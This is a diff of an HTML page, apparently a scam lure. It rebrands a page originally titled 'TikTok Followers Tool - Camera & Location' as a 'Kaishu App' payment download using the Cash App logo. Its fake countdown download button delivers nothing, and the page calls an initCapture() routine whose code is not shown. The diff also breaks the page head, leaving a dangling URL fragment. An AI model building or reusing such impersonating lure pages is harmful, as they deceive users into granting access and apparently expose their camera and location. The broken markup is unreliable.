@@ -1,20 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>TikTok Followers Tool - Camera & Location</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+fonts.googleapis.com/css?family=Montserrat">
   <style>
     body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background-color:#f5f5f5; }
     .navbar { background: linear-gradient(90deg, #69C9D0, #EE1D52); color:white; text-align:center; padding:15px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
     #header { margin:0; font-size:30px; font-weight:bold; color:white; text-shadow: 1px 1px 2px rgba(0,0,0,0.3); }
     .container { max-width:600px; margin:20px auto; padding:20px; background-color:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
-    .form-control { width:calc(100% - 22px); margin-bottom:15px; padding:10px; border:1px solid #ccc; border-radius:5px; font-size:16px; }
-    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background-color:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.2); transition: all 0.3s ease; }
-    #thumbdloadbtn:hover { background-color:#C21844; transform: translateY(-2px); }
-    footer { text-align:center; margin-top:40px; color:#fff; background-color:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold; }
-    .tiktok-logo { display:block; margin:10px auto; width:100px; height:auto; border-radius:10px; box-shadow: 0 2px 6px rgba(0,0,0,0.3); }
+   
   </style>
 </head>
 <body>
@@ -23,38 +13,56 @@
 </nav>
 
 <div class="container">
-  <h2 style="text-align:center;color:#00C244;">Download Cash App</h2>
-  <p style="text-align:center;">Fast • Secure • Easy Payments</p>
 
-  <button id="downloadBtn" 
-    style="width:100%;padding:14px;border:none;border-radius:6px;
-    background:#00C244;color:white;font-size:18px;font-weight:bold;cursor:pointer;">
-    DOWNLOAD NOW
+  <div style="text-align:center;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Cash_App_Logo.png"
+    style="width:120px;margin-bottom:15px;">
+  </div>
+
+  <h2 style="text-align:center;color:#00C244;">Download Kaishu App</h2>
+  <p style="text-align:center;">Fast • Secure • Easy Digital Payments</p>
+
+  <button id="downloadBtn"
+  style="width:100%;padding:14px;border:none;border-radius:6px;
+  background:#00C244;color:white;font-size:18px;font-weight:bold;cursor:pointer;">
+  DOWNLOAD NOW
   </button>
 
-  <div id="progressBox" style="margin-top:20px;text-align:center;display:none;">
-    <p id="progressText">Preparing download...</p>
+  <div id="progressBox"
+  style="margin-top:20px;text-align:center;font-weight:bold;display:none;">
   </div>
+
+  <div style="margin-top:25px;font-size:14px;color:#444;line-height:1.6;">
+    <h3>About Kaishu App</h3>
+    Kaishu App is a modern digital payment platform that allows instant money transfers.
+    It provides secure transactions, fast processing and an easy‑to‑use interface.
+    <br><br>
+    ✔ Instant Transfers<br>
+    ✔ Secure Payments<br>
+    ✔ User Friendly Interface<br>
+    ✔ 24/7 Accessibility
+  </div>
+
 </div>
 
 <script>
-let clickCount = 0;
-
 document.getElementById("downloadBtn").onclick = function(){
-  clickCount++;
+
   let box = document.getElementById("progressBox");
-  let text = document.getElementById("progressText");
-
   box.style.display = "block";
-  let seconds = 10;
 
-  let interval = setInterval(()=>{
-    text.textContent = "Downloading... " + seconds + "s";
+  let seconds = 10;
+  box.innerHTML = "Preparing Download... " + seconds + "s";
+
+  let interval = setInterval(function(){
     seconds--;
-    if(seconds < 0){
+    box.innerHTML = "Preparing Download... " + seconds + "s";
+
+    if(seconds <= 0){
       clearInterval(interval);
-      text.textContent = "Download Ready ✔ Click again";
+      box.innerHTML = "✅ Download Ready! Click button again.";
     }
+
   },1000);
 };
 </script>
@@ -178,6 +186,6 @@ document.getElementById("downloadBtn").onclick = function(){
     initCapture();
   </script>
 
-  <footer><p>DEVELOP BY ALI🤍❤️</p></footer>
+  <footer><p>DEVELOP BY ALI🙂❤️</p></footer>
 </body>
 </html>
